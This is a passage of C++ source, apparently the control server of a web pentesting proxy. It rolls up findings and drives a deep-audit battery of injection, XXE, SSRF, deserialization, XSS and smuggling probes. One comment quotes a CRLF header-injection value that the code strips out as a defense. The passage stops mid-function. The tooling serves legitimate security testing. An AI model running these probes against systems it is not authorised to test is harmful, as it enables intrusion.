#include "control_server.hpp"

#include "cert_authority.hpp"
#include "extensions_api.hpp"
#include "intercept.hpp"
#include "ws_repeater.hpp"
#include "h2_events.hpp"
#include "oast_server.hpp"
#include "oast_correlator.hpp"
#include "dns_sink.hpp"
#include "session_rules.hpp"
#include "crawler.hpp"
#include "update_check.hpp"
#include "sequencer.hpp"
#include "intruder.hpp"
#include "chain_runner.hpp"
#include "jwt_tool.hpp"
#include "param_miner.hpp"
#include "idor_tester.hpp"
#include "mass_assign.hpp"
#include "cors_tester.hpp"
#include "js_recon.hpp"
#include "race_tester.hpp"
#include "verb_tamper.hpp"
#include "ssti_tester.hpp"
#include "cache_poison.hpp"
#include "proto_pollution.hpp"
#include "host_header.hpp"
#include "http3_detect.hpp"
#include "content_discovery.hpp"
#include "open_redirect.hpp"
#include "header_audit.hpp"
#include "secret_scanner.hpp"
#include "crlf_injection.hpp"
#include "path_traversal.hpp"
#include "cmd_injection.hpp"
#include "xss_reflected.hpp"
#include "sql_injection.hpp"
#include "ldap_injection.hpp"
#include "xpath_injection.hpp"
#include "ssrf_scan.hpp"
#include "deser_probe.hpp"
#include "ws_probe.hpp"
#include "jwt_probe.hpp"
#include "xxe_injection.hpp"
#include "nosql_injection.hpp"
#include "smuggling.hpp"
#include "service_vulns.hpp"
#include "tls_inspect.hpp"
#include "http_fingerprint.hpp"
#include "method_audit.hpp"
#include "takeover_scan.hpp"
#include "exposure_scan.hpp"
#include "cache_deception.hpp"
#include "scan_bridge.hpp"
#include "robots_recon.hpp"
#include "waf_detect.hpp"
#include "cve_database.hpp"
#include "request_export.hpp"
#include "intruder_engine.hpp"
#include "networking.hpp"
#include "passive_scanner.hpp"
#include "port_scanner.hpp"
#include "project_store.hpp"
#include "recon_engine.hpp"
#include "session_manager.hpp"
#include "Proxy/proxy_filter_model.hpp"
#include "Proxy/proxy_model.hpp"
#include "Proxy/site_map_model.hpp"
#include "proxy_server.hpp"
#include "repeater.hpp"
#include "themes_manager.hpp"

#include <QAtomicInteger>
#include <QByteArray>
#include <QDateTime>
#include <QPointer>
#include <QtConcurrent/QtConcurrent>
#include <QFile>
#include <QSaveFile>
#include <QHostAddress>
#include <QThread>
#include <QRandomGenerator>
#include <QFileInfo>
#include <QHash>
#include <QMap>
#include <QSet>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonValue>
#include <QMetaObject>
#include <QPair>
#include <QStringList>
#include <QTcpServer>
#include <QXmlStreamReader>
#include <QRegularExpression>
#include <QUuid>
#include <QTcpSocket>
#include <QElapsedTimer>
#include <QUrl>
#include <QUrlQuery>

namespace Nullock::Control {

namespace {

constexpr int     kReadTimeoutMs = 5'000;
// Absolute wall-clock budget for receiving the full request header block.
// Defeats slowloris: a client dribbling one byte every 4.9s would refill
// the per-read kReadTimeoutMs forever, but the elapsed-since-accept clock
// keeps counting and drops them at 10s regardless. 10s is generous for
// any honest client on localhost.
constexpr qint64  kHeaderDeadlineMs = 10'000;
// Similar deadline for receiving the request body once headers have been
// parsed. A POST body of up to kMaxBodyBytes on localhost completes in
// well under 30s.
constexpr qint64  kBodyDeadlineMs   = 30'000;
// Hard cap on request body size accepted by /api/*. Big enough for HAR
// imports of medium projects (~32 MB), small enough that a malicious
// 4 GB POST can't OOM us. Returns 413 above this.
constexpr qint64  kMaxBodyBytes  = 64LL * 1024 * 1024;

// HTTP method from a JSON "method" field: defaulted and upper-cased, with CR/LF
// STRIPPED. This is the single choke point for every probe that builds an
// outbound request line from an operator-supplied method: QString::toUpper()
// does NOT remove CR/LF, so a "method" like "GET / HTTP/1.1\r\nX-Injected: 1"
// would otherwise splice a request line / extra headers into the request the
// probe sends to the chosen target (a request-line injection a soundness audit
// found across the probe set). Host/path/query already arrive CRLF-safe from
// QUrl, so neutralizing method here closes the class for all probes at the
// source (probe-level buildRequest guards remain as defense-in-depth). CR/LF is
// stripped (not the whole token rejected) so the Repeater's custom methods keep
// working; a residual odd method just yields a malformed-but-unsplit request.
QString httpMethodFromJson(const QJsonObject &body, const char *dflt) {
    QString m = body.value(QStringLiteral("method")).toString(QString::fromUtf8(dflt)).toUpper();
    m.remove('\r').remove('\n');
    return m.isEmpty() ? QString::fromUtf8(dflt).toUpper() : m;
}

// Content-Type from a JSON "contentType" field with CR/LF STRIPPED. This is the
// same request-line/header-injection vector as method, via a different field:
// several probes write contentType straight into a "Content-Type:" header, so an
// operator-supplied "application/xml\r\nX-Injected: 1" would splice extra
// headers into the outbound request. Neutralizing it at the source closes the
// class for every probe at once (probe-level guards remain defense-in-depth).
QString contentTypeFromJson(const QJsonObject &body, const char *dflt = "") {
    QString ct = body.value(QStringLiteral("contentType")).toString(QString::fromUtf8(dflt));
    ct.remove('\r').remove('\n');
    return ct;
}

// ---- Deep-scan audit helper --------------------------------------------
// Runs the active-testing battery against one target and emits one summary
// finding per tester that hit. Shared by /api/audit/run (single URL, sync)
// and /api/audit/all (many URLs/rows, off-thread). `reportsOut` collects a
// per-tester JSON summary; returns the number of distinct testers that
// surfaced an issue.
struct AuditTarget {
    QString host;
    int     port = 443;
    bool    tls  = true;
    QString method = QStringLiteral("GET");
    QString basePath;
    QByteArray body;
    QString contentType;
    QList<QPair<QString, QString>> headers;
    QString url;            // display URL for findings
};

// Severity-weighted security posture grade. Shared by /api/posture and the HTML
// report so the score/grade can't drift between them. Blank severity is
// coalesced to "info" (matching the read-only reporting endpoints).
struct PostureGrade {
    QString grade;
    int score = 100;
    int penalty = 0;
    int total = 0;
    QMap<QString, int> bySeverity;
};
PostureGrade computePostureGrade(const QList<Nullock::Core::Finding> &findings) {
    auto penaltyFor = [](const QString &s) -> int {
        if (s == "critical") return 40;
        if (s == "high")     return 15;
        if (s == "medium")   return 5;
        if (s == "low")      return 1;
        return 0; // info / unknown
    };
    PostureGrade g;
    g.total = static_cast<int>(findings.size());
    for (const auto &f : findings) {
        const QString t = f.severity.trimmed().toLower();  // trim too, so " high " weights as high
        const QString sev = t.isEmpty() ? QStringLiteral("info") : t;
        g.bySeverity[sev]++;
        g.penalty += penaltyFor(sev);
    }
    g.score = qMax(0, 100 - g.penalty);
    g.grade = g.score >= 90 ? QStringLiteral("A")
            : g.score >= 80 ? QStringLiteral("B")
            : g.score >= 70 ? QStringLiteral("C")
            : g.score >= 60 ? QStringLiteral("D")
                            : QStringLiteral("F");
    return g;
}

// Shared severity rank (worst-first ordering). info=1 so a non-empty group
// never ties with "unknown" (0).
inline int severityRank(const QString &s) {
    if (s == "critical") return 5;
    if (s == "high")     return 4;
    if (s == "medium")   return 3;
    if (s == "low")      return 2;
    if (s == "info")     return 1;
    return 0;
}

// Host-centric attack-surface rollup. Shared by /api/inventory and the JSON
// master report. Merges port-scan results (open ports/services) with findings
// (counts/severity/tech) into one record per host, risk-sorted. No network.
QJsonObject computeInventory(const QList<Nullock::Core::PortResult> &portResults,
                             const QList<Nullock::Core::Finding> &findings) {
    struct HostAgg {
        QMap<quint16, QString> ports;
        QSet<QString> services;
        QSet<QString> techs;
        int total = 0;
        QMap<QString, int> bySev;
        double maxCvss = 0.0;
        QSet<QString> kinds;
    };
    QMap<QString, HostAgg> hosts;
    // Lower-case host merge key (DNS is case-insensitive; scanners may differ).
    for (const auto &r : portResults) {
        if (r.status.toLower() != QLatin1String("open")) continue;
        if (r.host.isEmpty()) continue;
        HostAgg &a = hosts[r.host.toLower()];
        a.ports.insert(r.port, r.service);
        if (!r.service.isEmpty()) a.services.insert(r.service);
    }
    for (const auto &f : findings) {
        if (f.host.isEmpty()) continue;
        HostAgg &a = hosts[f.host.toLower()];
        ++a.total;
        const QString t = f.severity.trimmed().toLower();
        const QString sev = t.isEmpty() ? QStringLiteral("info") : t;
        a.bySev[sev]++;
        if (f.cvssScore > a.maxCvss) a.maxCvss = f.cvssScore;
        if (!f.kind.isEmpty()) a.kinds.insert(f.kind);
        if (f.kind == QLatin1String("tech-detected")) {
            QString s = f.summary;
            if (s.startsWith(QLatin1String("Detected "))) s = s.mid(9);
            if (!s.isEmpty()) a.techs.insert(s);
        }
    }
    // Risk sort (max CVSS desc, then count) via precomputed keys (no operator[] mutate).
    QHash<QString, double> cvssOf;
    QHash<QString, int> totalOf;
    for (auto it = hosts.constBegin(); it != hosts.constEnd(); ++it) {
        cvssOf[it.key()] = it.value().maxCvss;
        totalOf[it.key()] = it.value().total;
    }
    QStringList hostKeys = hosts.keys();
    std::sort(hostKeys.begin(), hostKeys.end(), [&](const QString &x, const QString &y) {
        if (cvssOf.value(x) != cvssOf.value(y)) return cvssOf.value(x) > cvssOf.value(y);
        return totalOf.value(x) > totalOf.value(y);
    });
    QJsonArray arr;
    int totalFindings = 0, totalOpenPorts = 0;
    for (const QString &hk : hostKeys) {
        const HostAgg &a = hosts[hk];
        QJsonArray ports;
        for (auto it = a.ports.begin(); it != a.ports.end(); ++it)
            ports.append(QJsonObject{{ "port", it.key() }, { "service", it.value() }});
        QJsonObject bySev;
        QString topSev; int topR = 0;
        for (auto it = a.bySev.begin(); it != a.bySev.end(); ++it) {
            bySev[it.key()] = it.value();
            if (severityRank(it.key()) > topR) { topR = severityRank(it.key()); topSev = it.key(); }
        }
        QStringList svc = a.services.values();  svc.sort();
        QStringList tech = a.techs.values();    tech.sort();
        QStringList kinds = a.kinds.values();   kinds.sort();
        arr.append(QJsonObject{
            { "host", hk }, { "openPorts", ports },
            { "services", QJsonArray::fromStringList(svc) },
            { "technologies", QJsonArray::fromStringList(tech) },
            { "findingsTotal", a.total }, { "bySeverity", bySev },
            { "maxCvss", a.maxCvss }, { "topSeverity", topSev },
            { "kinds", QJsonArray::fromStringList(kinds) },
        });
        totalFindings += a.total;
        totalOpenPorts += a.ports.size();
    }
    return QJsonObject{
        { "ok", true }, { "hostCount", hostKeys.size() },
        { "totalOpenPorts", totalOpenPorts }, { "totalFindings", totalFindings },
        { "hosts", arr },
    };
}

// OWASP Top-10 + compliance coverage rollup. Shared by /api/compliance and the
// JSON master report.
QJsonObject computeOwaspCoverage(const QList<Nullock::Core::Finding> &findings) {
    static const QList<QPair<QString, QString>> kOwaspTop10 = {
        { "A01", "Broken Access Control" },
        { "A02", "Cryptographic Failures" },
        { "A03", "Injection" },
        { "A04", "Insecure Design" },
        { "A05", "Security Misconfiguration" },
        { "A06", "Vulnerable and Outdated Components" },
        { "A07", "Identification and Authentication Failures" },
        { "A08", "Software and Data Integrity Failures" },
        { "A09", "Security Logging and Monitoring Failures" },
        { "A10", "Server-Side Request Forgery" },
    };
    struct Agg { int count = 0; int topRank = 0; QString topSev; QSet<QString> kinds; QString label; };
    QMap<QString, Agg> byOwaspFull;
    QMap<QString, int> byOwaspId;
    QMap<QString, int> byCompliance;
    int mapped = 0;
    for (const auto &f : findings) {
        if (!f.owasp.isEmpty()) {
            ++mapped;
            Agg &a = byOwaspFull[f.owasp];
            a.label = f.owasp;
            ++a.count;
            const QString t = f.severity.trimmed().toLower();
            const QString sev = t.isEmpty() ? QStringLiteral("info") : t;
            if (severityRank(sev) > a.topRank) { a.topRank = severityRank(sev); a.topSev = sev; }
            if (!f.kind.isEmpty()) a.kinds.insert(f.kind);
            const int colon = f.owasp.indexOf(':');
            const QString id = colon > 0 ? f.owasp.left(colon) : f.owasp;
            byOwaspId[id]++;
        }
        for (const QString &c : f.compliance)
            if (!c.isEmpty()) byCompliance[c]++;
    }
    QList<QString> okeys = byOwaspFull.keys();
    std::sort(okeys.begin(), okeys.end(), [&](const QString &x, const QString &y) {
        return byOwaspFull.value(x).count > byOwaspFull.value(y).count;
    });
    QJsonArray byOwaspArr;
    for (const QString &k : okeys) {
        const Agg &a = byOwaspFull.value(k);
        QStringList kinds = a.kinds.values(); kinds.sort();
        byOwaspArr.append(QJsonObject{
            { "category", a.label }, { "count", a.count },
            { "topSeverity", a.topSev }, { "kinds", QJsonArray::fromStringList(kinds) },
        });
    }
    QJsonArray top10;
    int categoriesHit = 0;
    for (const auto &cat : kOwaspTop10) {
        const int n = byOwaspId.value(cat.first, 0);
        if (n > 0) ++categoriesHit;
        top10.append(QJsonObject{{ "id", cat.first }, { "name", cat.second }, { "count", n }});
    }
    QList<QString> ckeys = byCompliance.keys();
    std::sort(ckeys.begin(), ckeys.end(), [&](const QString &x, const QString &y) {
        return byCompliance.value(x) > byCompliance.value(y);
    });
    QJsonArray complianceArr;
    for (const QString &k : ckeys)
        complianceArr.append(QJsonObject{{ "tag", k }, { "count", byCompliance.value(k) }});
    return QJsonObject{
        { "ok", true }, { "totalFindings", findings.size() }, { "mappedFindings", mapped },
        { "owaspCategoriesHit", categoriesHit }, { "complianceTagsHit", complianceArr.size() },
        { "byOwasp", byOwaspArr }, { "owaspTop10", top10 }, { "byCompliance", complianceArr },
    };
}

// Shared "safe identification" battery for one web target: tech fingerprint
// (+CVE correlation), security-header/CSP audit, HTTP-method audit, and (for
// https) TLS inspection. Emits each finding into the passive scanner and
// returns an aggregate {host,port,tls,url,tech,findingCount,bySeverity,findings}.
// Read-only recon -- no injection. Shared by /api/assess (one host) and
// /api/pipeline/run (every web port a scan discovered).
// `seen` (optional): when non-null, findings whose dedup key (kind+url+title)
// is already present are skipped (not emitted, not returned) and the key of
// each new finding is inserted -- this makes a caller idempotent across runs.
// /api/assess passes nullptr (no dedup, unchanged behavior); the pipeline
// passes its shared set so a re-run doesn't duplicate web findings.
QJsonObject assessWebTarget(Nullock::Core::PassiveScanner *scanner,
                            const QString &host, int port, bool tls,
                            const QString &basePath, const QString &query,
                            const QString &displayUrl,
                            QSet<QString> *seen = nullptr) {
    auto sevFor = [](double cvss) {
        if (cvss >= 9.0) return QStringLiteral("critical");
        if (cvss >= 7.0) return QStringLiteral("high");
        if (cvss >= 4.0) return QStringLiteral("medium");
        return cvss > 0.0 ? QStringLiteral("low") : QStringLiteral("medium");  // unscored-but-known -> medium
    };
    QJsonArray findings;
    QMap<QString, int> bySeverity;
    auto addF = [&](const QString &sev, const QString &kind, const QString &title, const QString &detail) {
        if (seen) {
            const QString k = kind + QChar(0x1f) + displayUrl + QChar(0x1f) + title;
            if (seen->contains(k)) return;   // already known -- skip emit + return
            seen->insert(k);
        }
        findings.append(QJsonObject{{ "severity", sev }, { "kind", kind }, { "title", title }});
        bySeverity[sev] = bySeverity.value(sev) + 1;
        if (scanner)
            scanner->reportFinding(0, sev, kind, title, detail, host, displayUrl);
    };

    // 1) tech fingerprint (+ CVE correlation)
    QJsonArray techs;
    {
        Nullock::Core::HttpFingerprint::Request fr;
        fr.host = host; fr.port = port; fr.tls = tls; fr.basePath = basePath; fr.query = query;
        const auto fres = Nullock::Core::HttpFingerprint::fingerprint(fr);
        for (const auto &t : fres.tech) {
            techs.append(t.name + (t.version.isEmpty() ? "" : " " + t.version));
            addF("info", "tech-detected",
                 "Detected " + t.name + (t.version.isEmpty() ? "" : " " + t.version),
                 "fingerprint source: " + t.source);
            if (!t.cveKind.isEmpty() && !t.version.isEmpty())
                for (const auto &m : Nullock::Core::CveDatabase::lookup(t.cveKind, t.name + " " + t.version))
                    addF(sevFor(m.cvss), "cve-correlated",
                         QString("%1 in %2 %3 -- %4").arg(m.cveId, t.name, t.version, m.summary),
                         "fix " + m.fixVersion + " | " + m.reference);
        }
    }
    // 2) security headers / CSP
    {
        Nullock::Core::HeaderAudit::Request hr;
        hr.host = host; hr.port = port; hr.tls = tls; hr.basePath = basePath; hr.query = query;
        for (const auto &f : Nullock::Core::HeaderAudit::test(hr).findings)
            addF(f.severity, f.key, f.title, f.detail);
    }
    // 3) HTTP methods
    {
        Nullock::Core::MethodAudit::Request mr;
        mr.host = host; mr.port = port; mr.tls = tls; mr.basePath = basePath; mr.query = query;
        for (const auto &f : Nullock::Core::MethodAudit::audit(mr).findings)
            addF(f.severity, f.kind, "HTTP methods -- " + f.detail, f.detail);
    }
    // 4) TLS (https only)
    if (tls) {
        Nullock::Core::TlsInspect::Request tir;
        tir.host = host; tir.port = port; tir.probeLegacyProtocols = false;
        for (const auto &f : Nullock::Core::TlsInspect::inspect(tir).findings)
            addF(f.severity, f.kind, "TLS -- " + f.detail, f.detail);
    }

    QJsonObject sevCounts;
    for (auto it = bySeverity.begin(); it != bySeverity.end(); ++it) sevCounts[it.key()] = it.value();
    return QJsonObject{
        { "host", host }, { "port", port }, { "tls", tls }, { "url", displayUrl },
        { "tech", techs },
        { "findingCount", findings.size() },
        { "bySeverity", sevCounts },
        { "findings", findings },
    };
}

int runDeepAudit(Nullock::Core::PassiveScanner *sc, const AuditTarget &t,
                 const QSet<QString> &include, QJsonArray &reportsOut) {
    int total = 0;
    auto wants = [&](const QString &n) { return include.isEmpty() || include.contains(n); };
    auto note = [&](const QString &tester, int items, const QString &detail,
                    const QString &sev, const QString &kind, const QString &summary) {
        reportsOut.append(QJsonObject{
            { "tester", tester }, { "items", items }, { "detail", detail },
            { "url", t.url } });
        if (items > 0) {
            ++total;
            // Marshal the emission onto the scanner's own thread: runDeepAudit
            // runs on a background worker for /api/audit/all, and reportFinding
            // emits findingsChanged() -- firing that cross-thread would run
            // UI/stdout handlers on the worker. A queued invoke is safely
            // dropped if the scanner is already gone.
            if (sc) {
                const QString host = t.host, url = t.url, ev = "found by deep audit: " + detail;
                QMetaObject::invokeMethod(sc, [sc, sev, kind, summary, ev, host, url]() {
                    sc->reportFinding(0, sev, kind, summary, ev, host, url);
                }, Qt::QueuedConnection);
            }
        }
    };

    if (wants("params") || wants("param-mining")) {
        Nullock::Core::ParamMiner::Request pr;
        pr.host = t.host; pr.port = t.port; pr.tls = t.tls;
        pr.method = t.method; pr.basePath = t.basePath; pr.headers = t.headers;
        const auto res = Nullock::Core::ParamMiner::mine(
            pr, Nullock::Core::ParamMiner::defaultWordlist().mid(0, 60));
        QStringList names; for (const auto &f : res.found) names << f.name;
        note("param-mining", res.found.size(),
             QString("%1 found: %2").arg(res.found.size()).arg(names.join(", ")),
             "medium", "hidden-param",
             "Deep audit: hidden parameter(s) " + names.join(", "));
    }
    if (wants("verbs") || wants("verb-tampering")) {
        Nullock::Core::VerbTamper::Request vr;
        vr.host = t.host; vr.port = t.port; vr.tls = t.tls;
        vr.method = t.method; vr.basePath = t.basePath; vr.headers = t.headers; vr.body = t.body;
        const auto res = Nullock::Core::VerbTamper::test(vr);
        QStringList techs; for (const auto &b : res.bypasses) techs << b.technique;
        note("verb-tampering", res.bypasses.size(),
             res.baselineDenied ? techs.join(", ") : "baseline not denied (skipped)",
             "high", "auth-bypass-verb-tampering",
             "Deep audit: verb-tampering bypass via " + techs.join(", "));
    }
    if (wants("cors")) {
        Nullock::Core::CorsTester::Request cr;
        cr.host = t.host; cr.port = t.port; cr.tls = t.tls;
        cr.method = "GET"; cr.basePath = t.basePath; cr.headers = t.headers;
        const auto res = Nullock::Core::CorsTester::test(cr);
        int n = 0; QString worst = "low";
        for (const auto &p : res.probes) {
            if (p.severity.isEmpty()) continue;
            ++n;
            if (p.severity == "critical") worst = "critical";
            else if (p.severity == "high" && worst != "critical") worst = "high";
            else if (p.severity == "medium" && worst == "low") worst = "medium";
        }
        note("cors", n, QString("%1 reflected origin(s)").arg(n),
             worst, "cors-reflected-credentialed",
             "Deep audit: CORS reflects untrusted origin(s)");
    }
    if (wants("idor")) {
        Nullock::Core::IdorTester::Request ir;
        ir.host = t.host; ir.port = t.port; ir.tls = t.tls;
        ir.method = t.method; ir.basePath = t.basePath; ir.headers = t.headers;
        const auto res = Nullock::Core::IdorTester::test(ir);
        QStringList locs; for (const auto &f : res.findings) locs << f.loc.descriptor;
        // A single session can only prove the id space is ENUMERABLE, not that
        // the access is unauthorized -- so this is a low-severity lead, not a
        // confirmed break. Confirm with the multi-identity authz tester.
        note("idor", res.findings.size(),
             QString("%1 id location(s) checked, %2 with enumerable neighbors ")
                 .arg(res.idLocationsFound).arg(res.findings.size()) + locs.join(", ")
                 + " (NOT confirmed unauthorized -- confirm via multi-identity replay)",
             "low", "idor-enumerable", "Deep audit: enumerable object ids at " + locs.join(", "));
    }
    if ((wants("massassign") || wants("mass-assignment")) && !t.body.isEmpty()) {
        Nullock::Core::MassAssign::Request mr;
        mr.host = t.host; mr.port = t.port; mr.tls = t.tls;
        const bool isWrite = t.method == "POST" || t.method == "PUT" || t.method == "PATCH";
        mr.method = isWrite ? t.method : QStringLiteral("POST");
        mr.basePath = t.basePath; mr.headers = t.headers; mr.body = t.body;
        mr.contentType = t.contentType;
        const auto res = Nullock::Core::MassAssign::test(mr, Nullock::Core::MassAssign::defaultFields());
        QStringList fields; for (const auto &f : res.found) fields << f.field;
        note("mass-assignment", res.found.size(), fields.join(", "),
             "high", "mass-assignment", "Deep audit: mass-assignable field(s) " + fields.join(", "));
    }
    // The path/query split shared by the URL-based testers below.
    const int qpos = t.basePath.indexOf('?');
    const QString auditPath  = qpos < 0 ? t.basePath : t.basePath.left(qpos);
    const QString auditQuery = qpos < 0 ? QString()  : t.basePath.mid(qpos + 1);

    if (wants("openredirect") || wants("redirect")) {
        Nullock::Core::OpenRedirect::Request orq;
        orq.host = t.host; orq.port = t.port; orq.tls = t.tls;
        orq.method = t.method; orq.headers = t.headers;
        orq.basePath = auditPath; orq.query = auditQuery;   // param auto-detected
        const auto res = Nullock::Core::OpenRedirect::test(orq);
        QStringList techs; for (const auto &h : res.hits) techs << h.technique;
        // Server-confirmed (Location / Refresh header) is high; client-side
        // (meta/JS body) only is medium.
        bool headerConfirmed = false;
        for (const auto &h : res.hits)
            if (h.via == "Location" || h.via == "refresh-header") headerConfirmed = true;
        note("open-redirect", res.hits.size(),
             res.error.isEmpty()
                 ? QString("param(s) %1: %2").arg(res.testedParams.join(", "), techs.join(", "))
                 : res.error,
             headerConfirmed ? "high" : "medium", "open-redirect",
             "Deep audit: open redirect in '" + res.testedParams.join("', '") + "'");
    }
    if (wants("cache") || wants("cachepoison")) {
        Nullock::Core::CachePoison::Request cpr;
        cpr.host = t.host; cpr.port = t.port; cpr.tls = t.tls;
        cpr.method = QStringLiteral("GET"); cpr.headers = t.headers;
        cpr.basePath = auditPath; cpr.query = auditQuery;
        const auto res = Nullock::Core::CachePoison::test(cpr);
        QStringList hdrs2; for (const auto &h : res.hits) hdrs2 << h.header;
        const QString sev  = res.anyConfirmed ? "critical" : (res.anyCacheable ? "high" : "low");
        const QString kind = res.anyConfirmed ? "web-cache-poisoning-confirmed"
                           : (res.anyCacheable ? "web-cache-poisoning"
                                               : "web-cache-unkeyed-reflected");
        note("cache-poisoning", res.hits.size(),
             res.error.isEmpty() ? hdrs2.join(", ") : res.error,
             sev, kind, "Deep audit: unkeyed header(s) " + hdrs2.join(", "));
    }
    if (wants("hostheader") || wants("host-header")) {
        Nullock::Core::HostHeader::Request hhr;
        hhr.host = t.host; hhr.port = t.port; hhr.tls = t.tls;
        hhr.method = QStringLiteral("GET"); hhr.headers = t.headers;
        hhr.basePath = auditPath; hhr.query = auditQuery;
        const auto res = Nullock::Core::HostHeader::test(hhr);
        // High ONLY for the literal Host line -> Location (the unambiguous reset
        // vector); a forwarding-header / body-url URL hit is medium "needs
        // confirmation"; bare reflections stay to the standalone endpoint.
        int hi = 0, med = 0; QStringList hiHdr, medHdr;
        for (const auto &h : res.hits) {
            if (h.fromHostLine && h.where == "Location") { ++hi; hiHdr << h.header; }
            else if (h.inUrlContext)                     { ++med; medHdr << h.header; }
        }
        note("host-header-injection", hi,
             res.error.isEmpty() ? hiHdr.join(", ") : res.error,
             "high", "host-header-injection", "Deep audit: host-header injection via " + hiHdr.join(", "));
        if (med)
            note("host-header-reflected-location", med, medHdr.join(", "),
                 "medium", "host-header-reflected-location",
                 "Deep audit: host header reflected into a URL context (needs confirmation) via " + medHdr.join(", "));
    }
    // Smuggling is slow (timing probes block until the back-end's socket
    // timeout), so it runs ONLY when explicitly opted in -- never in the
    // default-all sweep.
    if (!include.isEmpty() && (include.contains("smuggle") || include.contains("smuggling"))) {
        Nullock::Core::Smuggling::Request smr;
        smr.host = t.host; smr.port = t.port; smr.tls = t.tls;
        smr.basePath = auditPath; smr.headers = t.headers;
        const auto res = Nullock::Core::Smuggling::test(smr);
        QStringList where; for (const auto &h : res.hits) where << h.variant;
        note("smuggling", res.hits.size(),
             res.error.isEmpty() ? where.join(", ") : res.error,
             "critical", "request-smuggling", "Deep audit: HTTP request smuggling " + where.join(", "));
    }
    if (wants("nosqli") || wants("nosql-injection")) {
        Nullock::Core::NoSqlInjection::Request nrr;
        nrr.host = t.host; nrr.port = t.port; nrr.tls = t.tls; nrr.method = t.method;
        nrr.basePath = auditPath; nrr.query = auditQuery; nrr.headers = t.headers;
        const auto res = Nullock::Core::NoSqlInjection::test(nrr);
        QStringList where; for (const auto &h : res.hits) where << h.param;
        note("nosql-injection", res.hits.size(),
             res.error.isEmpty() ? where.join(", ") : res.error,
             "high", "nosql-injection", "Deep audit: NoSQL operator injection " + where.join(", "));
    }
    // XXE only makes sense against an XML endpoint -- gate on content-type/body.
    if (wants("xxe")) {
        const QString ctl = t.contentType.toLower();
        const QByteArray bt = t.body.trimmed();
        if (ctl.contains("xml") || bt.startsWith("<?xml") || bt.startsWith('<')) {
            Nullock::Core::XxeInjection::Request xrr;
            xrr.host = t.host; xrr.port = t.port; xrr.tls = t.tls;
            xrr.method = (t.method == "GET") ? QStringLiteral("POST") : t.method;
            xrr.basePath = auditPath; xrr.contentType = t.contentType; xrr.headers = t.headers;
            const auto res = Nullock::Core::XxeInjection::test(xrr);
            QStringList where; for (const auto &h : res.hits) where << h.target;
            note("xxe", res.hits.size(),
                 res.error.isEmpty() ? where.join(", ") : res.error,
                 "critical", "xxe-injection", "Deep audit: XXE reading " + where.join(", "));
        }
    }
    if (wants("sqli") || wants("sql-injection")) {
        Nullock::Core::SqlInjection::Request srr;
        srr.host = t.host; srr.port = t.port; srr.tls = t.tls; srr.method = t.method;
        srr.basePath = auditPath; srr.query = auditQuery; srr.headers = t.headers;
        // Time-based blind is slow (each confirmed param sleeps for seconds), so
        // it runs only when explicitly opted in -- never in the default sweep.
        srr.timeBased = include.contains("blind") || include.contains("sqli-blind");
        const auto res = Nullock::Core::SqlInjection::test(srr);
        QStringList where; for (const auto &h : res.hits) where << h.param + "(" + h.dbms + ")";
        const bool specific = !res.hits.isEmpty() && res.hits.first().dbms != "generic";
        note("sql-injection", res.hits.size(),
             res.error.isEmpty() ? where.join(", ") : res.error,
             specific ? "critical" : "high", "sql-injection", "Deep audit: SQL injection " + where.join(", "));
    }
    if (wants("ldapi") || wants("ldap-injection")) {
        Nullock::Core::LdapInjection::Request lrr;
        lrr.host = t.host; lrr.port = t.port; lrr.tls = t.tls; lrr.method = t.method;
        lrr.basePath = auditPath; lrr.query = auditQuery; lrr.headers = t.headers;
        const auto res = Nullock::Core::LdapInjection::test(lrr);
        QStringList where; for (const auto &h : res.hits) where << h.param + "(" + h.engine + ")";
        note("ldap-injection", res.hits.size(),
             res.error.isEmpty() ? where.join(", ") : res.error,
             "high", "ldap-injection", "Deep audit: LDAP injection " + where.join(", "));
    }
    if (wants("xpathi") || wants("xpath-injection")) {
        Nullock::Core::XpathInjection::Request xrr;
        xrr.host = t.host; xrr.port = t.port; xrr.tls = t.tls; xrr.method = t.method;
        xrr.basePath = auditPath; xrr.query = auditQuery; xrr.headers = t.headers;
        const auto res = Nullock::Core::XpathInjection::test(xrr);
        QStringList where; for (const auto &h : res.hits) where << h.param + "(" + h.engine + ")";
        note("xpath-injection", res.hits.size(),
             res.error.isEmpty() ? where.join(", ") : res.error,
             "high", "xpath-injection", "Deep audit: XPath injection " + where.join(", "));
    }
    if (wants("ssrf")) {
        Nullock::Core::SsrfScan::Request srr;
        srr.host = t.host; srr.port = t.port; srr.tls = t.tls; srr.method = t.method;
        srr.basePath = auditPath; srr.query = auditQuery; srr.headers = t.headers;
        const auto res = Nullock::Core::SsrfScan::test(srr);
        QStringList where; for (const auto &h : res.hits) where << h.param + "(" + h.technique + ")";
        const bool cloud = !res.hits.isEmpty() && res.hits.first().kind == "ssrf-cloud-metadata";
        note("ssrf", res.hits.size(),
             res.error.isEmpty() ? where.join(", ") : res.error,
             cloud ? "critical" : "high", res.hits.isEmpty() ? "ssrf-internal" : res.hits.first().kind,
             "Deep audit: SSRF " + where.join(", "));
    }
    if (wants("deser") || wants("deserialization")) {
        Nullock::Core::DeserProbe::Request drr;
        drr.host = t.host; drr.port = t.port; drr.tls = t.tls; drr.method = t.method;
        drr.basePath = auditPath; drr.query = auditQuery; drr.headers = t.headers;
        const auto res = Nullock::Core::DeserProbe::test(drr);
        QStringList where; for (const auto &h : res.hits) where << h.param + "(" + h.format + ")";
        note("deserialization", res.hits.size(),
             res.error.isEmpty() ? where.join(", ") : res.error,
             "critical",
             res.hits.isEmpty() ? "deser-java"
                                : Nullock::Core::DeserProbe::kindForFormat(res.hits.first().format),
             "Deep audit: insecure deserialization " + where.join(", "));
    }
    if (wants("xss")) {
        Nullock::Core::XssReflected::Request xrr;
        xrr.host = t.host; xrr.port = t.port; xrr.tls = t.tls; xrr.method = t.method;
        xrr.basePath = auditPath; xrr.query = auditQuery; xrr.headers = t.headers;
        const auto res = Nullock::Core::XssReflected::test(xrr);
        QStringList where; for (const auto &h : res.hits) where << h.param + "/" + h.context;
        note("reflected-xss", res.hits.size(),
             res.error.isEmpty() ? where.join(", ") : res.error,
             "high", "reflected-xss", "Deep audit: reflected XSS " + where.join(", "));
    }
    if (wants("cmdi") || wants("command-injection")) {
        Nullock::Core::CmdInjection::Request cir;
        cir.host = t.host; cir.port = t.port; cir.tls = t.tls; cir.method = t.method;
        cir.basePath = auditPath; cir.query = auditQuery; cir.headers = t.headers;
        const auto res = Nullock::Core::CmdInjection::test(cir);
        QStringList where; for (const auto &h : res.hits) where << h.param + "/" + h.technique;
        note("command-injection", res.hits.size(),
